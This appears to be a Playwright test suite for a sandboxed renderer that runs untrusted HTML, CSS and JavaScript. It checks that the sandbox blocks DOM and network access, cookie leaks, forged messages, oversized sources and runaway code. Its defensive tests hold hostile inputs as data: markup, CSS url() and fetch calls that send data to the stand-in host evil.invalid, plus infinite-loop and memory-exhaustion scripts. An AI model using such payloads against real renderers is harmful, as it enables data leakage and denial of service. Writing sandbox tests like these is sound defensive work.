import { expect, test, type Page } from "@playwright/test";

declare global { interface Window { proof: { state(): { slider: number }; activate(source: any, migrate: (value: any) => any): Promise<boolean>; hostile(js: string): void } } }

const frame = (page: Page) => page.frameLocator("#artifact");
const mouseClick = async (page: Page, selector: string) => {
  const box = await page.locator(selector).boundingBox();
  expect(box).not.toBeNull();
  await page.mouse.click(box!.x + box!.width / 2, box!.y + box!.height / 2);
};

test.beforeEach(async ({ page }) => {
  await page.goto("/host.html");
  await expect(page.locator("#status")).toHaveText("ready", { timeout: 20_000 });
});

test("renders chart, supports keyboard control, and reopens host-persisted state", async ({ page }) => {
  await expect(frame(page).getByRole("img", { name: "Spending by category" })).toBeVisible();
  const slider = frame(page).getByRole("slider", { name: "Scenario" });
  await slider.focus(); await slider.press("ArrowRight");
  await expect(frame(page).locator('[data-slot="value"]')).toHaveText("Illustrative buffer: €26");
  await mouseClick(page, "#compact"); await expect(page.locator("#artifact")).toHaveAttribute("width", "320"); await expect(slider).toBeVisible();
  await mouseClick(page, "#full"); await expect(page.locator("#artifact")).toHaveAttribute("width", "800"); await expect(slider).toBeVisible();
  await mouseClick(page, "#reload");
  await expect(page.locator("#status")).toHaveText("ready");
  await expect(frame(page).getByRole("slider", { name: "Scenario" })).toHaveValue("26");
});

test("VM has no DOM, storage, network, navigation, credentials, eval, or Function", async ({ page }) => {
  await page.evaluate(() => window.proof.hostile(`artifact.ui.patch({slot:"value",text:[typeof window,typeof document,typeof localStorage,typeof sessionStorage,typeof indexedDB,typeof fetch,typeof XMLHttpRequest,typeof WebSocket,typeof location,typeof open,typeof navigator,typeof eval,typeof Function].join(",")})`));
  await expect(page.locator("#status")).toHaveText("ready");
  await expect(frame(page).locator('[data-slot="value"]')).toHaveText(Array(13).fill("undefined").join(","));
});

test("renderer receives no host cookie or storage credential", async ({ context, page }) => {
  await context.addCookies([{ name: "app_session", value: "sentinel", domain: "localhost", path: "/" }]);
  await page.evaluate(() => sessionStorage.setItem("credential", "sentinel"));
  let rendererCookie: string | undefined;
  page.on("request", request => { if (request.url().startsWith("http://127.0.0.1:4174/renderer.html")) rendererCookie = request.headers().cookie; });
  await page.reload();
  await expect(page.locator("#status")).toHaveText("ready", { timeout: 20_000 });
  expect(rendererCookie).toBeUndefined();
  expect(await frame(page).locator("body").evaluate(() => ({ cookie: document.cookie, storage: sessionStorage.getItem("credential") }))).toEqual({ cookie: "", storage: null });
});

test("cannot forge internal messages or host-owned state metadata", async ({ page }) => {
  const before = await page.evaluate(() => window.proof.state());
  await page.evaluate(() => window.proof.hostile(`artifact.state.set({slider:77,version:999,extra:"owned"})`));
  await expect(page.locator("#status")).toHaveText(/rejected/);
  expect(await page.evaluate(() => window.proof.state())).toEqual(before);
  await page.evaluate(() => window.proof.hostile(`emit("state",{slider:77})`));
  await expect(page.locator("#status")).toHaveText(/rejected/);
  expect(await page.evaluate(() => window.proof.state())).toEqual(before);
});

test("sanitizes HTML and rejects resource-loading CSS", async ({ page }) => {
  const requests: string[] = []; page.on("request", request => requests.push(request.url()));
  expect(await page.evaluate(() => window.proof.activate({
    html: `<section><img src="https://evil.invalid/secret"><iframe src="https://evil.invalid"></iframe><form action="https://evil.invalid"><input type="file"></form><div onclick="location='https://evil.invalid'" data-slot="value"></div></section>`,
    css: `section{background:url(https://evil.invalid/leak)}`,
    js: `artifact.ui.patch({slot:"value",text:"bad"})`,
  }, value => value))).toBeFalsy();
  await expect(page.locator("#status")).toHaveText("ready", { timeout: 20_000 });
  expect(requests.some(url => url.includes("evil.invalid"))).toBeFalsy();
});

test("CSP blocks renderer network even if sanitization were bypassed", async ({ page }) => {
  const result = await frame(page).locator("body").evaluate(async body => {
    let violations = 0; document.addEventListener("securitypolicyviolation", () => violations++);
    const image = document.createElement("img"); image.src = "https://evil.invalid/image"; body.append(image);
    let blocked = false; try { await fetch("https://evil.invalid/data"); } catch { blocked = true; }
    await new Promise(resolve => setTimeout(resolve, 50)); return { blocked, violations };
  });
  expect(result.blocked).toBeTruthy(); expect(result.violations).toBeGreaterThan(0);
});

test("rejects forged global messages and oversized worker messages", async ({ page }) => {
  await page.evaluate(() => window.postMessage({ type: "ready", protocol: 1, nonce: "forged" }, "*"));
  await expect(page.locator("#status")).toHaveText("ready");
  await page.evaluate(() => window.proof.hostile(`artifact.ui.patch({slot:"value",text:"x".repeat(1048577)})`));
  await expect(page.locator("#status")).toHaveText("terminated");
});

test("rejects source above two MiB before opening a renderer", async ({ page }) => {
  await page.evaluate(() => window.proof.hostile(" ".repeat(2 * 1024 * 1024 + 1)));
  await expect(page.locator("#status")).toHaveText("source_limit");
});

test("stops runaway execution within one second while host remains interactive", async ({ page }) => {
  await page.evaluate(() => window.proof.hostile(`while(true){}`));
  await expect(page.locator("#status")).toHaveText("connected", { timeout: 5_000 });
  const started = Date.now();
  await mouseClick(page, "#stop");
  await expect(page.locator("#status")).toHaveText("stopped", { timeout: 1_000 });
  expect(Date.now() - started).toBeLessThan(1_000);
  await expect(page.locator("#reload")).toBeEnabled();
});

test("terminates message floods and excessive allocation", async ({ page }) => {
  await page.evaluate(() => window.proof.hostile(`for(let i=0;i<101;i++) artifact.ui.patch({slot:"value",text:String(i)})`));
  await expect(page.locator("#status")).toHaveText("terminated");
  await page.evaluate(() => window.proof.hostile(`const x=[]; while(true) x.push("x".repeat(1048576))`));
  await expect(page.locator("#status")).toHaveText(/rejected|terminated/, { timeout: 15_000 });
});

test("version swap succeeds and failed migration preserves that active pair", async ({ page }) => {
  const before = await page.evaluate(() => window.proof.state());
  const next = { html: `<section><h1>Version two</h1><div data-slot="value"></div></section>`, css: `section{color:#172033}`, js: `artifact.ui.patch({slot:"value",text:"active-v2"})` };
  expect(await page.evaluate(source => window.proof.activate(source, value => ({ ...value, version: 2 })), next)).toBeTruthy();
  await expect(page.locator("#status")).toHaveText("ready", { timeout: 15_000 });
  await expect(frame(page).locator('[data-slot="value"]')).toHaveText("active-v2");
  const invalid = { ...next, js: "const = malformed" };
  expect(await page.evaluate(source => window.proof.activate(source, value => value), invalid)).toBeFalsy();
  await expect(page.locator("#status")).toHaveText("ready", { timeout: 15_000 });
  await expect(frame(page).locator('[data-slot="value"]')).toHaveText("active-v2");
  const activated = await page.evaluate(() => window.proof.activate({ html: "<section></section>", css: "", js: "" }, () => { throw new Error("incompatible"); }));
  expect(activated).toBeFalsy();
  expect(await page.evaluate(() => window.proof.state())).toEqual({ ...before, version: 2 });
  await page.locator("#reload").click();
  await expect(page.locator("#status")).toHaveText("ready");
  await expect(frame(page).locator('[data-slot="value"]')).toHaveText("active-v2");
});
